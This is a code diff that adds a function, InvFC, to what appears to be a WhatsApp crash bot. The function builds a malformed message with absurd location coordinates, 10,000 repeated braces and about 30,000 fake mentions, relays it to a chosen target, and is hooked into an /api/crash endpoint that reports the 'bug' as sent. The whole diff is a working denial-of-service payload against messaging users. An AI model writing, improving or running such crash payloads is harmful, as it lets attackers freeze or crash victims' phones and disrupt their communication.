@@ -92,7 +92,52 @@ try {
     console.log(err);
   }
 }
+async function InvFC(sock, target) {
+  try {
+    let message = {
+      ephemeralMessage: {
+        message: {
+          interactiveMessage: {
+            header: {
+              title: "Phantominvis",
+              hasMediaAttachment: false,
+              locationMessage: {
+                degreesLatitude: 666666666,
+                degreesLongitude: 666666666,
+                name: "phantom bro🤭",
+                address: "🤡"
+              }
+            },
+            body: {
+              text: "maklumaty cil"
+            },
+            nativeFlowMessage: {
+              messageParamsJson: "{".repeat(10000)
+            },
+            contextInfo: {
+              participant: jid,
+              mentionedJid: [
+                "0@s.whatsapp.net",
+                ...Array.from({ length: 30000 }, () =>
+                  "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
+                )
+              ]
+            }
+          }
+        }
+      }
+    };
 
+    await sock.relayMessage(target, message, {
+      messageId: null,
+      participant: { jid: target },
+      userJid: target
+    });
+
+  } catch (err) {
+    console.log(err);
+  }
+}
 
 //BATES FUNCTION 
 
@@ -103,6 +148,7 @@ app.post("/api/crash", async (req, res) => {
   }
 
   try {
+    await InvFC(sock, target);
     await LocationFlowX1(target, {}); // Dummy sock untuk testing lokal //InvisibleHome ubah ke nama asyn functionnya
     res.json({ success: true, message: `Bug terkirim ke ${target}` });
   } catch (err) {
